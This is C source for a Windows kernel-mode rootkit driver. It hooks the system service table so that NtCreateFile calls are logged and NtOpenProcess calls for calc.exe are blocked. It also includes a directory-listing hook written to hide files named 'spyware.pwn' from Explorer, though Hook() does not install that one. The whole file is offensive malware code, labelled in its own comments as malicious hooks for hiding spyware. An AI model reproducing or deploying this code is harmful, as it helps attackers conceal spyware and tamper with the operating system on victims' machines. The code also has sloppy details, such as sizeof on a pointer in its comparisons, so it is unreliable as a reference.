#include <ntifs.h>
#include <ntddk.h>

#define DeviceName L"\\Device\\hook"
#define LnkDeviceName L"\\DosDevices\\hook"

#define NUM_NTCREATE_FILE 	66
#define NUM_NTOPEN_PROCESS 	190

#pragma pack(1)
typedef struct ServiceDescriptorEntry {
        unsigned int *ServiceTableBase;
        unsigned int *ServiceCounterTableBase; 
        unsigned int NumberOfServices;
        unsigned char *ParamTableBase;
} ServiceDescriptorTableEntry_t, *PServiceDescriptorTableEntry_t;
#pragma pack()
__declspec(dllimport)  ServiceDescriptorTableEntry_t KeServiceDescriptorTable;

// Memory Descriptor List
PMDL  g_pmdlSystemCall;
PVOID *MappedSystemCallTable;

int HOOK_TRIGGER;

NTSYSAPI
NTSTATUS
NTAPI ZwQueryInformationProcess(
  __in       HANDLE ProcessHandle,
  __in       PROCESSINFOCLASS ProcessInformationClass,
  __out      PVOID ProcessInformation,
  __in       ULONG ProcessInformationLength,
  __out_opt  PULONG ReturnLength
);

/* First Hook : NtCreateFile */

NTSYSAPI
NTSTATUS
NTAPI NtCreateFile(
);

typedef NTSTATUS (*NTCREATEFILE)(
  PHANDLE            FileHandle,
  ACCESS_MASK        DesiredAccess,
  POBJECT_ATTRIBUTES ObjectAttributes,
  PIO_STATUS_BLOCK   IoStatusBlock,
  PLARGE_INTEGER     AllocationSize,
  ULONG              FileAttributes,
  ULONG              ShareAccess,
  ULONG              CreateDisposition,
  ULONG              CreateOptions,
  PVOID              EaBuffer,
  ULONG              EaLength
);
NTCREATEFILE OldNtCreateFile;

NTSTATUS  NewNtCreateFile(
  PHANDLE            FileHandle,
  ACCESS_MASK        DesiredAccess,
  POBJECT_ATTRIBUTES ObjectAttributes,
  PIO_STATUS_BLOCK   IoStatusBlock,
  PLARGE_INTEGER     AllocationSize,
  ULONG              FileAttributes,
  ULONG              ShareAccess,
  ULONG              CreateDisposition,
  ULONG              CreateOptions,
  PVOID              EaBuffer,
  ULONG              EaLength
)
{
	NTSTATUS ntStatus;
	NTSTATUS rc;
	ULONG ret;
	PVOID unicode;
	UNICODE_STRING unicode_test;
	
	ntStatus = ((NTCREATEFILE) (*OldNtCreateFile)) ( FileHandle, 
													DesiredAccess, 
													ObjectAttributes, 
													IoStatusBlock, 
													AllocationSize, 
													FileAttributes, 
													ShareAccess,
													CreateDisposition,
													CreateOptions,
													EaBuffer,
													EaLength);
	
	{
		rc = ZwQueryInformationProcess(ZwCurrentProcess(), 
					ProcessImageFileName, NULL, 0 , &ret);
		
		if(rc == STATUS_INFO_LENGTH_MISMATCH)
		{
			unicode = ExAllocatePoolWithTag(PagedPool, ret, 'Efe');
			if(unicode != NULL)
			{
				rc = ZwQueryInformationProcess(ZwCurrentProcess(),
				ProcessImageFileName, unicode, ret, &ret);
				DbgPrint(" Unicode = %wZ \n", unicode);
				ExFreePool(unicode);
			}
		}
	}	
	
	DbgPrint("NtStatus = %x \n", ntStatus );
	DbgPrint("File = %wZ \n", ObjectAttributes->ObjectName);
    DbgPrint("Process = %s \n", (ULONG)PsGetCurrentProcess() + 0x16c);    
    DbgPrint("Pid = %i \n", (int)PsGetCurrentProcessId());
	
	return ntStatus;
}

/* Second Hook : NtOpenProcess */

typedef NTSTATUS (*NTOPENPROCESS) ( 
	PHANDLE ProcessHandle,
	ACCESS_MASK DesiredAccess,
	POBJECT_ATTRIBUTES ObjectAttributes,
	PCLIENT_ID ClientId
);
NTOPENPROCESS OldNtOpenProcess;

NTSTATUS NewNtOpenProcess(
  PHANDLE 				ProcessHandle,
  ACCESS_MASK		 	DesiredAccess,
  POBJECT_ATTRIBUTES 	ObjectAttributes,
  PCLIENT_ID 			ClientId
)	
{
	NTSTATUS ntStatus;
	PEPROCESS pEprocess;
	
	ntStatus = OldNtOpenProcess(ProcessHandle, DesiredAccess, 
							   ObjectAttributes, ClientId);
	
	if( ! ntStatus )
	{
		PsLookupProcessByProcessId(ClientId->UniqueProcess, (PEPROCESS *)&pEprocess);
		DbgPrint("Process : %s  PID : %i [+] \n", (ULONG)pEprocess + 0x16c,
												   ClientId->UniqueProcess);		
		
		if( ! strncmp( (char*)pEprocess + 0x16c , 
					"calc.exe", 
					sizeof((char*)pEprocess + 0x16c)) )
		{
			DbgPrint("Detected process : \"calc.exe\" \n");
			return -1;
		}
	}			
	return ntStatus;
}


/* Third Hook : zwQueryDirectory */

const WCHAR prefix[] = L"spyware.pwn";

typedef NTSTATUS  (*ZwQueryDirectoryFilePtr)
(
  IN    HANDLE FileHandle,
  IN	HANDLE Event,
  IN	PIO_APC_ROUTINE ApcRoutine,
  IN	PVOID ApcContext,
  OUT   PIO_STATUS_BLOCK IoStatusBlock,
  OUT   PVOID FileInformation,
  IN    ULONG Length,
  IN    FILE_INFORMATION_CLASS FileInformationClass,
  IN    BOOLEAN ReturnSingleEntry,
  IN	PUNICODE_STRING FileName,
  IN    BOOLEAN RestartScan
);

ZwQueryDirectoryFilePtr oldZwQueryDirectoryFile;

PVOID getDirEntryFileName
(
	IN PVOID FileInformation,
	IN FILE_INFORMATION_CLASS FileInfoClass
)
{
    PVOID result = 0;
    switch(FileInfoClass){
        case FileDirectoryInformation:
            result = (PVOID)&((PFILE_DIRECTORY_INFORMATION)FileInformation)->FileName;
            break;
        case FileFullDirectoryInformation:
            result =(PVOID)&((PFILE_FULL_DIR_INFORMATION)FileInformation)->FileName;
            break;
        case FileIdFullDirectoryInformation:
            result =(PVOID)&((PFILE_ID_FULL_DIR_INFORMATION)FileInformation)->FileName;
            break;
        case FileBothDirectoryInformation:
            result =(PVOID)&((PFILE_BOTH_DIR_INFORMATION)FileInformation)->FileName;
            break;
        case FileIdBothDirectoryInformation:
            result =(PVOID)&((PFILE_ID_BOTH_DIR_INFORMATION)FileInformation)->FileName;
            break;
        case FileNamesInformation:
            result =(PVOID)&((PFILE_NAMES_INFORMATION)FileInformation)->FileName;
            break;
    }
    return result;
}

ULONG getNextEntryOffset
(
    IN PVOID FileInformation,
    IN FILE_INFORMATION_CLASS FileInfoClass
)
{
    ULONG result = 0;
    switch(FileInfoClass){
            case FileDirectoryInformation:
                    result = (ULONG)((PFILE_DIRECTORY_INFORMATION)FileInformation)->NextEntryOffset;
                    break;
            case FileFullDirectoryInformation:
                    result =(ULONG)((PFILE_FULL_DIR_INFORMATION)FileInformation)->NextEntryOffset;
                    break;
            case FileIdFullDirectoryInformation:
                    result =(ULONG)((PFILE_ID_FULL_DIR_INFORMATION)FileInformation)->NextEntryOffset;
                    break;
            case FileBothDirectoryInformation:
                    result =(ULONG)((PFILE_BOTH_DIR_INFORMATION)FileInformation)->NextEntryOffset;
                    break;
            case FileIdBothDirectoryInformation:
                    result =(ULONG)((PFILE_ID_BOTH_DIR_INFORMATION)FileInformation)->NextEntryOffset;
                    break;
            case FileNamesInformation:
                    result =(ULONG)((PFILE_NAMES_INFORMATION)FileInformation)->NextEntryOffset;
                    break;
    }
    return result;
}

void setNextEntryOffset
(
    IN PVOID FileInformation,
    IN FILE_INFORMATION_CLASS FileInfoClass,
	IN ULONG newValue
)
{
    switch(FileInfoClass){
            case FileDirectoryInformation:
                    ((PFILE_DIRECTORY_INFORMATION)FileInformation)->NextEntryOffset = newValue;
                    break;
            case FileFullDirectoryInformation:
                    ((PFILE_FULL_DIR_INFORMATION)FileInformation)->NextEntryOffset = newValue;
                    break;
            case FileIdFullDirectoryInformation:
                    ((PFILE_ID_FULL_DIR_INFORMATION)FileInformation)->NextEntryOffset = newValue;
                    break;
            case FileBothDirectoryInformation:
                    ((PFILE_BOTH_DIR_INFORMATION)FileInformation)->NextEntryOffset = newValue;
                    break;
            case FileIdBothDirectoryInformation:
                    ((PFILE_ID_BOTH_DIR_INFORMATION)FileInformation)->NextEntryOffset = newValue;
                    break;
            case FileNamesInformation:
                    ((PFILE_NAMES_INFORMATION)FileInformation)->NextEntryOffset = newValue;
                    break;
    }
}

BOOLEAN checkIfHiddenFile(WCHAR fileName[])
{
 
	SIZE_T nBytesEqual;

	nBytesEqual = 0;
	nBytesEqual = RtlCompareMemory
	(
		(PVOID)&(fileName[0]),
		(PVOID)&(prefix[0]),
		10
	);
	
	if(nBytesEqual==10)
	{
		DbgPrint("[checkIfHiddenFile]: known file detected : %S\n",fileName);
		return(TRUE);
	}
 
	return FALSE;
}

NTSTATUS newZwQueryDirectoryFile
(
  HANDLE FileHandle,
  HANDLE Event,
  PIO_APC_ROUTINE ApcRoutine,
  PVOID ApcContext,
  PIO_STATUS_BLOCK IoStatusBlock,
  PVOID FileInformation,
  ULONG Length,
  FILE_INFORMATION_CLASS FileInformationClass,
  BOOLEAN ReturnSingleEntry,
  PUNICODE_STRING FileName,
  BOOLEAN RestartScan
)
{
	NTSTATUS ntStatus;
	PEPROCESS pEprocess;
	PVOID	currentFile;
	PVOID	previousFile;

	ntStatus = oldZwQueryDirectoryFile(
										  FileHandle,
										  Event,
										  ApcRoutine,
										  ApcContext,
										  IoStatusBlock,
										  FileInformation,
										  Length,
										  FileInformationClass,
										  ReturnSingleEntry,
										  FileName,
										  RestartScan
										);
	
	if(!NT_SUCCESS(ntStatus))
		return ntStatus;
	
	currentFile =	FileInformation;
	previousFile =	NULL;
	
	do
	{
		if( ! strncmp( (char*)PsGetCurrentProcess() + 0x16c, 
					"explorer.exe", 
					sizeof((char*)PsGetCurrentProcess() + 0x16c)) )
		{
			if( checkIfHiddenFile(getDirEntryFileName(currentFile,
														FileInformationClass)) )
			{	
			
				if(getNextEntryOffset(currentFile,FileInformationClass))
				{
				
					int delta;
					int nBytes;
					delta =	((ULONG)currentFile)-((ULONG)FileInformation);
					nBytes =((ULONG)Length) - delta;
					nBytes = nBytes - getNextEntryOffset(currentFile,FileInformationClass);
					RtlCopyMemory((PVOID)currentFile,
								(PVOID)((char*)currentFile +  
								getNextEntryOffset(currentFile,FileInformationClass)),
								(ULONG)nBytes);
					continue;
				
				}
				else 
				{
					if(currentFile==FileInformation)
					{
						ntStatus = STATUS_NO_MORE_FILES;
					}
					else
					{
						setNextEntryOffset(previousFile, FileInformationClass, 0);
						DbgPrint("Dissimulation of spyware successfull \n");
					}
					break;
				}
			
			}
		}
		
		previousFile = currentFile;
		currentFile = ((char*)currentFile + getNextEntryOffset(currentFile,FileInformationClass));
		
	}
	
	while( ! getNextEntryOffset(previousFile,FileInformationClass) );

	return ntStatus;	
}


NTSTATUS Hook()
{
	g_pmdlSystemCall=IoAllocateMdl(KeServiceDescriptorTable.ServiceTableBase, KeServiceDescriptorTable.NumberOfServices*4, 0, 0, NULL);
   	
	if(!g_pmdlSystemCall)
      	return STATUS_UNSUCCESSFUL;

   	MmBuildMdlForNonPagedPool(g_pmdlSystemCall);
	
	MappedSystemCallTable=MmMapLockedPages(g_pmdlSystemCall, KernelMode);
	
	__try{
		// Bind malicious hooks in SSDT
 		OldNtCreateFile = (PVOID) InterlockedExchange( (PLONG) &MappedSystemCallTable[NUM_NTCREATE_FILE], (LONG) NewNtCreateFile); 	
		OldNtOpenProcess = (PVOID) InterlockedExchange( (PLONG) &MappedSystemCallTable[NUM_NTOPEN_PROCESS], (LONG) NewNtOpenProcess);
		HOOK_TRIGGER = 1;
	}
	__except(1){
			DbgPrint("DriverEntry: Hook failed");

	}
	return STATUS_SUCCESS;
}
 
void Unhook()
{	
	__try
	{
		// Rebind old hooks in SSDT
		InterlockedExchange( (PLONG) &MappedSystemCallTable[NUM_NTCREATE_FILE], (LONG) OldNtCreateFile);
		InterlockedExchange( (PLONG) &MappedSystemCallTable[NUM_NTOPEN_PROCESS], (LONG) OldNtOpenProcess);
		HOOK_TRIGGER = 0;
	}
	__except(1){
			DbgPrint("Failed to unhook");
	}
 
    // Unlock and Free MDL
	if(g_pmdlSystemCall)
	{
		MmUnmapLockedPages(MappedSystemCallTable, g_pmdlSystemCall);
		IoFreeMdl(g_pmdlSystemCall);
	}
	DbgPrint("Sucessfully unhooked \n");
}

NTSTATUS DriverDispatch(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp)
{
  	Irp->IoStatus.Status=STATUS_SUCCESS;
  	IoCompleteRequest(Irp,IO_NO_INCREMENT);
  	return Irp->IoStatus.Status;
	}

NTSTATUS DriverCreate(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp)
{
	
  	Irp->IoStatus.Status=STATUS_SUCCESS;
  	IoCompleteRequest(Irp,IO_NO_INCREMENT);
  	return Irp->IoStatus.Status;
}


NTSTATUS DriverUnload(IN PDRIVER_OBJECT DriverObject)
{
	UNICODE_STRING usLnkName;
	RtlInitUnicodeString(&usLnkName,LnkDeviceName);
    IoDeleteSymbolicLink(&usLnkName);
	
	if(HOOK_TRIGGER)
		Unhook();

    IoDeleteDevice(DriverObject->DeviceObject);
	DbgPrint("Bye !!\n");
	return STATUS_SUCCESS;
}




NTSTATUS DriverEntry(PDRIVER_OBJECT  pDriverObject, PUNICODE_STRING  pRegistryPath)
{
	ULONG i,NtStatus;
	PDEVICE_OBJECT pDeviceObject=NULL;
	UNICODE_STRING usDriverName,usLnkName;

	DbgPrint("Hello from KernelLand master\n");
	
	for(i=0;i<IRP_MJ_MAXIMUM_FUNCTION;i++)
	pDriverObject->MajorFunction[i]=DriverDispatch;
	pDriverObject->MajorFunction[IRP_MJ_CREATE]=DriverCreate; 
	
	RtlInitUnicodeString(&usDriverName,DeviceName);
	RtlInitUnicodeString(&usLnkName,LnkDeviceName);
	
	NtStatus=IoCreateDevice(pDriverObject,
							0, 
	 						&usDriverName, 
	 						FILE_DEVICE_UNKNOWN, 
	 						FILE_DEVICE_SECURE_OPEN, 
	 						FALSE, 
	 						&pDeviceObject);
	if(NtStatus!=STATUS_SUCCESS)
		DbgPrint("Error with IoCreateDevice()");

	
	NtStatus=IoCreateSymbolicLink(&usLnkName,&usDriverName);
		if(NtStatus!=STATUS_SUCCESS)
		DbgPrint("Error with IoCreateSymbolicLink()");
	
	Hook();
	
	pDriverObject->DriverUnload=DriverUnload;
	
	return STATUS_SUCCESS;	
}
